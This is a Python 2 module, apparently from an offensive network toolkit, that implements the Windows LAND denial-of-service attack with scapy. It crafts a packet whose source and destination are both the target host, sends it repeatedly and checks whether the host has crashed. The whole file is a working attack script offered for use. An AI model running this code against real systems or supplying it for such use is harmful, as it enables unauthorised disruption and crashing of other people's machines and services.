from scapy.all import *
from dos import DoS
import util


class land_dos(DoS):
    """ Module exploits the Windows LAND attack.  This DoS essentially sends a
        packet with the source and destination as the target host, so it will
        send itself packets infinitely until crash.

        http://insecure.org/sploits/land.ip.DOS.html
    """
    def __init__(self):
        super(land_dos, self).__init__('LAND DoS')

    def initialize(self):
        # supress scapy output
        conf.verb = 0

        try:
            self.get_ip()
            tmp = raw_input('[!] LAND attack at ip %s.  Is this correct? '
                                                            % self.target)
            if 'n' in tmp.lower():
                return

            pkt = IP(src=self.target, dst=self.target)
            pkt /= TCP(sport=134, dport=134)

            while True:
                print '[!] DoSing %s...' % self.target
                send(pkt)

                if self.is_alive():
                    util.Msg('Host appears to still be up.')
                    try:
                        tmp = raw_input('[!] Try again? ')
                    except Exception:
                        break
                    if 'n' in tmp.lower():
                        break
                else:
                    util.Msg('Host not responding!')
                    break
        except Exception, j:
            util.Error('Error: %s' % j)
            return
